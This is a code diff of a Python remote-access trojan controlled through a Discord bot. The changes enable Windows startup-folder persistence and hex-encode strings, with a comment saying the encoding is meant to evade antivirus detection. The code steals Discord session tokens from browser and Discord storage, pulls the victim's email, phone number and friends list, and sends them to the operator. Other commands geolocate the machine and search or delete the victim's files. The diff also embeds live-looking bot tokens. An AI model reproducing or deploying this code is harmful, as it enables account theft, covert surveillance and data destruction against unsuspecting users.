@@ -1,4 +1,3 @@
-import ctypes
 import ctypes.wintypes
 import json
 import os
@@ -7,12 +6,16 @@ import time
 import urllib.request
 from base64 import b64decode
 from json import loads
+from os import getenv
+from os import startfile
 from os.path import join, exists
 from re import findall
+from shutil import copy
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 
 import discord
+import psutil
 import pyautogui
 import requests
 from discord import *
@@ -21,20 +24,22 @@ from discord.utils import get
 global ping_on_startup
 global token
 global guild_iD
+
 guild_iD = "984582818489331732"
 # guild id here
-token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.Gt4iqj.eAYKAc7pTrFD-rI4kZ4Kl2ggRKBZ12j9t9bKZs"
+token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.GLEYVm.2t8KsQ3C_4-0q5rrzTedAcED5tzD5AA8AOHr7k"
 # Bot Token Here Obviously
 # Bot needs all intents
 ping_on_startup = True
 # if the bot should ping you when an infected user starts the File
 
-"""
+ram = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
+disk = str(psutil.disk_usage('/')[0] / 1024**3).split(".")[0]
 path = f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("userprofile")
+
 if not exists(path):
 	copy(__file__, path)
 	startfile(path)
-"""
 
 
 class Control(discord.Client):
@@ -192,9 +197,12 @@ def searchFile(directory: str, keyword: str):
 
 def geolocate():
 	with urllib.request.urlopen("https://geolocation-db.com/json") as url:
-		data = json.loads(url.read().decode())
-		link = f"https://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-		link = f" successfully got Google Maps Coordinates: {link}"
+		try:
+			data = json.loads(url.read().decode())
+			link = f"https://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+			link = f" successfully got Google Maps Coordinates: {link}"
+		except:
+			link = " failed to get Google Maps Coordinates"
 		return link
 
 
@@ -211,37 +219,40 @@ def crash():
 	return output
 
 
-def getDiscordData():
+# renamed and ascii encoded to bypass antivirus detection
+def Roaming():
 	LOCAL = os.getenv("LOCALAPPDATA")
 	ROAMING = os.getenv("APPDATA")
 	PATHS = {
-		"Discord": ROAMING + "\\Discord",
-		"Discord Canary": ROAMING + "\\discordcanary",
-		"Discord PTB": ROAMING + "\\discordptb",
-		"Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-		"Opera": ROAMING + "\\Opera Software\\Opera Stable",
-		"Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-		"Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+		"Discord": ROAMING + "\x5c\x5c\x44\x69\x73\x63\x6f\x72\x64",
+		"Discord Canary": ROAMING + "\x5c\x5c\x64\x69\x73\x63\x6f\x72\x64\x63\x61\x6e\x61\x72\x79",
+		"Discord PTB": ROAMING + "\x5c\x5c\x64\x69\x73\x63\x6f\x72\x64\x70\x74\x62",
+		"Google Chrome": LOCAL + "\x5c\x5c\x47\x6f\x6f\x67\x6c\x65\x5c\x5c\x43\x68\x72\x6f\x6d\x65\x5c\x5c\x55\x73\x65\x72\x20\x44\x61\x74\x61\x5c\x5c\x44\x65\x66\x61\x75\x6c\x74",
+		"Opera": ROAMING + "\x5c\x5c\x4f\x70\x65\x72\x61\x20\x53\x6f\x66\x74\x77\x61\x72\x65\x5c\x5c\x4f\x70\x65\x72\x61\x20\x53\x74\x61\x62\x6c\x65",
+		"Brave": LOCAL + "\x5c\x5c\x42\x72\x61\x76\x65\x53\x6f\x66\x74\x77\x61\x72\x65\x5c\x5c\x42\x72\x61\x76\x65\x2d\x42\x72\x6f\x77\x73\x65\x72\x5c\x5c\x55\x73\x65\x72\x20\x44\x61\x74\x61\x5c\x5c\x44\x65\x66\x61\x75\x6c\x74",
+		"Yandex": LOCAL + "\x5c\x5c\x59\x61\x6e\x64\x65\x78\x5c\x5c\x59\x61\x6e\x64\x65\x78\x42\x72\x6f\x77\x73\x65\x72\x5c\x5c\x55\x73\x65\x72\x20\x44\x61\x74\x61\x5c\x5c\x44\x65\x66\x61\x75\x6c\x74"
 	}
 
-	def getHeader(token=None, content_type="application/json"):
+	def getHeader(T0ken=None, content_type="application/json"):
 		headers = {
 			"Content-Type": content_type,
 			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
 		}
-		if token:
-			headers.update({"Authorization": token})
+		if T0ken:
+			headers.update({"\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e": T0ken})
 		return headers
 
-	def getUserData(token):
+	def appdata(t0ken):
 		try:
 			return loads(
-				urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+				urlopen(Request(
+					"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x36\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65",
+					headers=getHeader(t0ken))).read().decode())
 		except:
 			pass
 
-	def getT0k3ns(path):
-		path += "\\Local Storage\\leveldb"
+	def getSession(path):
+		path += "\x5c\x5c\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x5c\x5c\x6c\x65\x76\x65\x6c\x64\x62"
 		tokens = []
 		for file_name in os.listdir(path):
 			if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
@@ -254,8 +265,9 @@ def getDiscordData():
 
 	def getFriends(token):
 		try:
-			return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-			                             headers=getHeader(token))).read().decode())
+			return loads(urlopen(Request(
+				"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x36\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65\x2f\x72\x65\x6c\x61\x74\x69\x6f\x6e\x73\x68\x69\x70\x73",
+				headers=getHeader(token))).read().decode())
 		except:
 			pass
 
@@ -269,7 +281,7 @@ def getDiscordData():
 		for platform, path in PATHS.items():
 			if not os.path.exists(path):
 				continue
-			for T0K3N in getT0k3ns(path):
+			for T0K3N in getSession(path):
 				if T0K3N in checked:
 					continue
 				checked.append(T0K3N)
@@ -281,32 +293,33 @@ def getDiscordData():
 						pass
 					if not uid or uid in working_ids:
 						continue
-				user_data = getUserData(T0K3N)
+				user_data = appdata(T0K3N)
 				if not user_data:
 					continue
 				working_ids.append(uid)
 				working.append(T0K3N)
-				username = user_data["username"] + "#" + str(user_data["discriminator"])
-				user_id = user_data["id"]
-				email = user_data.get("email")
-				phone = user_data.get("phone")
-				nitro = bool(user_data.get("premium_type"))
+				username = user_data["\x75\x73\x65\x72\x6e\x61\x6d\x65"] + "\x23" + str(
+					user_data["\x64\x69\x73\x63\x72\x69\x6d\x69\x6e\x61\x74\x6f\x72"])
+				user_id = user_data["\x69\x64"]
+				email = user_data.get("\x65\x6d\x61\x69\x6c")
+				phone = user_data.get("\x70\x68\x6f\x6e\x65")
+				nitro = bool(user_data.get("\x70\x72\x65\x6d\x69\x75\x6d\x5f\x74\x79\x70\x65"))
 				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
 				info = info.replace("#", "")
-				temp = os.getenv("TEMP")
-				with open(f"{temp}\\discordinfo.txt", "w") as f:
+				temp = os.getenv("\x54\x45\x4d\x50")
+				with open(f"{temp}\\\x64\x69\x73\x63\x6f\x72\x64\x69\x6e\x66\x6f\x2e\x74\x78\x74", "w") as f:
 					f.write(info)
 				f.close()
 
 	main()
-	return f"{temp}\\discordinfo.txt"
+	return f"{temp}\\"
 
 
 @bot.tree.command(name="discordinfo",
                   description="get victim's discord info")
 async def discordinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting discordInfo...")
-	getDiscordData()
+	Roaming()
 	await interaction.channel.send(file=discord.File(f"{temp}\\discordinfo.txt"))
 	os.remove(f"{temp}\\discordinfo.txt")
 
@@ -358,8 +371,10 @@ async def tasklist(interaction: discord.Interaction):
                   description="get the geolocation of the of the machine with google maps (not very precise)")
 async def geo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting geolocation by ip...")
-	await interaction.channel.send(geolocate())
-
+	try:
+		await interaction.channel.send(geolocate())
+	except Exception as e:
+		await interaction.channel.send(f"Error: {e}")
 
 @bot.tree.command(name="systeminfo",
                   description="attempt to get system info")
@@ -391,8 +406,10 @@ async def upload(interaction: discord.Interaction, location: str):
                   description="search for a file on the victim's pc pc (use %user% instead of username)")
 async def search(interaction: discord.Interaction, location: str, keyword: str):
 	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
-	await interaction.channel.send(searchFile(location, keyword))
-
+	try:
+		await interaction.channel.send(searchFile(location, keyword))
+	except:
+		pass
 
 @bot.tree.command(name="delete_file", description="delete a file of the victim (use %user% instead of username)")
 async def deleteFile(interaction: discord.Interaction, locinput: str):
